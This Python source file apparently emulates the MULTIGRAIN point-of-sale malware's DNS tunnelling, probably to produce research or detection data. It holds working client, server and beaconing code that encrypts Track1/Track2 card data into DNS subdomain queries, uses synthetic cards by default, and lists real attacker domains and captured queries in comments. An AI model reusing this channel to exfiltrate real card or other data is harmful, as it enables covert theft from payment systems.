import codecs
import random
import sys
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from collections import namedtuple
from dnslib import DNSRecord, RR, QTYPE, A
from time import sleep
from typing import Tuple
from urllib.parse import parse_qs

from data.creditcard.ccgen import CreditCardGenerator
from malware import base, schedules
from malware.helper import jitter, HEX_CHARS_UPPER, hash_djb2
from util import info, ok
from .encoding import encode_label, decode_label, decode_label_to_str


class Client(base.Client):
    """
    Exfils Track1/Track2 card data.

    Behavior:
        "subdomains of 231 and 233 characters in length" (Talos)
        A records, answer: always "192.168.0.1"

    Schedule:
        "five minute intervals" (https://www.theregister.com/2016/04/20/vxers_pass_stolen_card_data_over_dns/)

    Sources:
        https://www.fireeye.com/blog/threat-research/2016/04/multigrain_pointo.html
        https://www.pandasecurity.com/mediacenter/malware/multigrain-malware-pos/
        https://blog.talosintelligence.com/2016/06/detecting-dns-data-exfiltration.html
    """

    # domains = [
    #     "dojfgj[.]com",  # pandasecurity.com / fireeye.com
    #     "amouc[.]com",  # Talos
    #     "beevish[.]com",  # Talos
    #     "datavhg[.]com"  # Infoblox
    # ]

    @staticmethod
    def _gen_host_id() -> str:
        # Generate Volume Serial Number
        serial = ''.join(random.choices(HEX_CHARS_UPPER, k=8))
        serial = f"{serial[:4]}-{serial[4:]}"

        # Generate last five bytes of MAC address
        mac = "".join(random.choices(HEX_CHARS_UPPER, k=10))

        return str(hash_djb2(serial + mac))

    def __init__(self, rsa_key: str, computer_name: str, domain: str = None, version: str = "3.0"):
        self.computer_name = computer_name
        self.version = version

        self.domain = domain if domain is not None else "multigrain.lan"

        # Generate random host ID
        self.host_id = Client._gen_host_id()

        # Import key and instantiate cipher
        self.cipher = PKCS1_v1_5.new(RSA.importKey((bytes(rsa_key, "utf8"))))

    def install(self):
        """
        Example (https://otx.alienvault.com/indicator/domain/datavhg.com)
        install.oa6ugt2nkbkvirksfvhectkfezwt2mztga3tsnbyhaydkjtwhuzs4ma.datavhg.com
        [p=COMPUTER-NAME&m=3307948805&v=3.0].domain.tld
        """
        label = f"p={self.computer_name}&m={self.host_id}&v={self.version}"
        return f"install.{encode_label(label)}.{self.domain}"

    def log(self, cc_data: str):
        """
        Example (https://blog.talosintelligence.com/2016/06/detecting-dns-data-exfiltration.html)
        nu6timrvguztkobwgyza.opbr3hzggfngkwhoy7qkucs6vxkf3g2layoexuyf5i2k3xsfwqlmbdncn2u3bu5.ooaazkh7n5ukjstcybv2653paktzo3y7ik6tjpxts77evdg3azdw6ryrtanbfmp.agw3for7sx5vds5snzs2lbt6tol7zuexuaukx4a52rvf4hrnccjjsx7epe3klne.3dc3y7p3zylqyefy.beevish.com
        """

        # Encrypt and encode
        data_bytes = codecs.encode(cc_data, 'utf8')
        encrypted = self.cipher.encrypt(data_bytes)
        encoded = encode_label(encrypted)

        # Split into separate labels (63 . 63 . 63 . 16 == 205)
        payload = '.'.join([encoded[i:i + 63] for i in range(0, len(encoded), 63)])

        # Return query
        return f"log.{encode_label(self.host_id)}.{payload}.{self.domain}"

    def __str__(self):
        return '%s(%s)' % (type(self).__name__, ', '.join('%s=%s' % item for item in vars(self).items()))


class Server(base.Server):
    Install = namedtuple('InstallResult', ['host_id', 'computer_name', 'version'])
    Log = namedtuple('LogResult', ['host_id', 'data'])

    def __init__(self, domain: str, server_ip: str, log_dir: str, rsa_key: str):
        super().__init__(domain, server_ip, log_dir)

        # Import key and instantiate cipher
        self.cipher = PKCS1_v1_5.new(RSA.importKey((bytes(rsa_key, "utf8"))))

    def receive(self, record: DNSRecord) -> DNSRecord:
        question = record.get_q()

        # Get payload from query
        payload = self.get_payload(question)

        # Process
        if payload is not False:
            self.process(payload)

            # Respond
            reply = record.reply()
            reply.add_answer(RR(question.get_qname(), QTYPE.A, rdata=A(self.server_ip), ttl=3600))
            return reply

        else:
            info(f"[MULTIGRAIN] Server: Ignoring query for other domain: {question.qname}")

    def process_payload(self, payload: str):

        # Split labels
        labels = payload.split('.')

        # Handle install request
        if labels[0] == "install" or len(labels) <= 4:

            idx = 1 if labels[0] == "install" else 0
            decoded = decode_label_to_str(labels[idx])
            args = parse_qs(decoded)

            if 'p' not in args:
                return Server.Install(None, None, None)
            else:
                return Server.Install(args['m'][0], args['p'][0], args['v'][0])

        # Handle log request
        else:

            idx = 0 if len(labels[0]) > 7 else 1
            host_id = decode_label_to_str(labels[idx])

            try:

                # Decode and decrypt
                if self.cipher is None:
                    payload_decrypted = None
                else:
                    payload_encoded = codecs.encode("".join(labels[idx + 1:idx + 5]), 'ascii')
                    payload_decoded = decode_label(payload_encoded)
                    payload_decrypted = self.cipher.decrypt(payload_decoded, None)

            except ValueError:
                # Reach this if decryption fails
                payload_decrypted = None

            # Convert to ASCII
            if payload_decrypted is not None:
                payload_decrypted = codecs.decode(payload_decrypted, 'utf8')

            return Server.Log(host_id, payload_decrypted)


class Exfiltration(base.ExfiltrationThread):

    def __init__(self, client: Client, dns_settings: Tuple[str, int], log_dir: str, schedule: schedules.TypeA,
                 data_source: CreditCardGenerator = None):

        super().__init__(client, dns_settings, log_dir)
        self.schedule = schedule
        self.unlimited_credit_cards = data_source or CreditCardGenerator(track_type=2)

    def run(self):
        info("[MULTIGRAIN] Started exfil thread.")

        # 1. Initial beaconing
        self.dns_query(self.client.install())

        # 2. Exfiltration (every five minutes)
        while True:

            # Determine size of current batch
            n_cards = self.schedule.lookup()

            if n_cards > 0:
                self.analytics(n_cards)
                info(self.print_debug("MULTIGRAIN", n_cards))

                for _ in range(n_cards):
                    card, _ = next(self.unlimited_credit_cards) or (ok("Exfil complete!") and sys.exit(0))

                    # Create DNSRecord and send!
                    self.dns_query(self.client.log(card), 'A')

            # Sleep for SLEEP + some jitter seconds
            sleep(jitter(self.schedule.get_interval(), jitter_range=.05))


def smoke_test():
    key = "-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQCgXdUBnhkltTjFOmDF64r3snPD1qU6B03S/EQx/DmeIh0xmphx\nLBIj9l5+uto6EYGUnw6ecBo7s1ziX7lJHPYN6EKqo0xRNn+d3WhkR03rYy98/JoS\nY8lKnzppiyp67As+jr3BWqphGSTc08NSvlrgN/dLExYQ/VXtp9gBCWddvwIDAQAB\nAoGBAI8xmdx65iuEeO+rY/P2kb0BTFtnU1vQX85wURhtBqnL/lNnno0XdA9GkzQH\n9op5TUJ/EFeq89GxI9RC8zh0ssNoWd3vJOZ+c3QUV4Uu5mRggib4TH/XbCRnqmTi\n0MXQvXCk+8FUzbszrsGX6QTMnEqs1UCZ+TQiBuev7cSNqrZpAkEAxeraIcoCtktc\nYR3yVsB8/MuqIq6tOPWR8sRP10oAnDMKHUx+LenAPCrSeS3Vxn0r7r4NGfgG1dbM\nLyqF6cr1PQJBAM9t22lugjHIz+hNdzWSuS49MGRx7rceIErcBL4nhy4LfvRkMabj\nUb3TNbm+MyyF9NDffEw4EGDetHXVB7AQpqsCQBeIyrFz5QiqQ2zk87kvIG2rBisj\nnEOGp/k3MMtH6HSqeQxs2SA6iHpfGTIBqkb1AXFdNg+dd6qb5SHCq7PWR30CQQCz\nPoMzgEMRMi4213oD2V4cDtQaeDmIE4hkJ+wRRacSquxx04L0a8re9fyfHTSrbLY5\nKGYIlwnQK6JVkFisVDcxAkBlzQBnts1u6HutMkhMzAwIU3kJjReS7upfupyol2tr\nxFh/8S7HaPMjyJY/w9WcLKOG1VjhTadWmM0LRQlDURdi\n-----END RSA PRIVATE KEY-----"
    client = Client(key, computer_name="THESIS", domain="multigrain.lan")

    install = client.install()
    log = client.log(";2226789592775813=082696402650581?")

    server = Server(key, domain="multigrain.lan")
    recv_inst = server.receive(install)
    recv_log = server.receive(log)

    print(recv_inst)
    print(recv_log)

    # # Real queries
    # print("\nReal queries:")
    # # https://otx.alienvault.com/indicator/domain/datavhg.com
    # # https://otx.alienvault.com/indicator/domain/amouc.com
    # # https://otx.alienvault.com/indicator/domain/dojfgj.com
    # # https://blog.talosintelligence.com/2016/06/detecting-dns-data-exfiltration.html
    # for q in [
    #     "install.oa6ugt2nkbkvirksfvhectkfezwt2mztga3tsnbyhaydkjtwhuzs4ma.datavhg.com",
    #     "lll.nu6timrshe4timrxhe4a.7vmq---redacted---hit.w6nwon3hnifbe4hy.amouc.com",
    #     "log.nu6timjqgq4dimbuhe.3ikfsb---redacted---cg3.7s3bnxqmavqy7sec.dojfgj.com",
    #     "log.nu6timrvguztkobwgyza.opbr3hzggfngkwhoy7qkucs6vxkf3g2layoexuyf5i2k3xsfwqlmbdncn2u3bu5.ooaazkh7n5ukjstcybv2653paktzo3y7ik6tjpxts77evdg3azdw6ryrtanbfmp.agw3for7sx5vds5snzs2lbt6tol7zuexuaukx4a52rvf4hrnccjjsx7epe3klne.3dc3y7p3zylqyefy.beevish.com"
    # ]:
    #     print(q)
    #     print(Server.receive(q))
    #     print()


if __name__ == "__main__":
    smoke_test()
